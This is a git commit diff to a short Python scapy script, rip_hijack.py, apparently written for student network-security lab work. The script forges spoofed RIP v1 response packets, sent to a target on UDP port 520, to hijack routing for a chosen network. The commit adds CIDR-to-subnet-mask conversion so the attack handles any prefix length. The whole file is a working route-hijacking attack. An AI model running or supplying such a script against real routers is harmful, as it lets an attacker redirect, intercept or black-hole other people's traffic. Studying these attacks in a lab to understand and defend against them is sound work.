797f7a2d74bde2275bc2d028d44b48a04c3688af
Kevin Nanhekhan <k.r.nanhekhan@student.tudelft.nl>
2022-02-26 00:17:05 +0100

    Update rip_hijack.py

--- network_layer/rip_hijack/rip_hijack.py
+++ network_layer/rip_hijack/rip_hijack.py
@@ -1,4 +1,6 @@
 import sys
+import socket
+import struct
 from scapy.all import *
 
 if __name__ == "__main__":
@@ -7,10 +9,14 @@ if __name__ == "__main__":
 	network_addr = str(sys.argv[2])
 	reroute_ip = str(sys.argv[3])
 
-	# Create packet for rerouting ip and send it.
+	# Separate Network IP adress from CIDR (Classless Inter-Domain Routing)
 	network_ip =network_addr.split("/")
+	host_bits = 32 - int(network_ip[1])
+	subnet_mask = socket.inet_ntoa(struct.pack('!I', (1 << 32) - (1 << host_bits)))
+	
+	# Create packet for rerouting ip and send it.
 	ip = IP(src=reroute_ip, dst=target_ip)
-	rip = RIP(cmd=2, version=1)/ RIPEntry(addr=network_ip[0], mask="255.255.255.0")
+	rip = RIP(cmd=2, version=1)/ RIPEntry(addr=network_ip[0], mask=subnet_mask)
 	pkt = ip/ UDP(dport=520)/ rip
 	send(pkt)
 
